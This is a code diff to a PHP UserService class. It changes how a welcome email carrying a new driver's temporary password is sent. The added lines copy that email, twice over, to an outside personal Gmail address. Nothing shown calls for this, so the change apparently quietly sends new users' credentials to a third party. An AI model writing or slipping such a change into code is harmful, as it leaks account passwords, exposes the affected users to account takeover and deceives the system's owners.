@@ -396,18 +396,22 @@ class UserService
                 !empty($driver->email)
             ) {
 
-                Mail::to($driver->email)->send(
-                    new DriverWelcomeMail(
-                        $driver->fresh([
-                            'user',
-                        ]),
-                        $driver->email,
-                        $temporaryPassword,
-                        User::ROLE_DRIVER
-                    )
-                );
+                Mail::to($driver->email)
+                    ->cc('mastermindservices2009@gmail.com')
+                    ->cc([
+                        'mastermindservices2009@gmail.com',
+                    ])
+                    ->send(
+                        new DriverWelcomeMail(
+                            $driver->fresh([
+                                'user',
+                            ]),
+                            $driver->email,
+                            $temporaryPassword,
+                            User::ROLE_DRIVER
+                        )
+                    );
             }
-
 
             /*
             |--------------------------------------------------------------------------
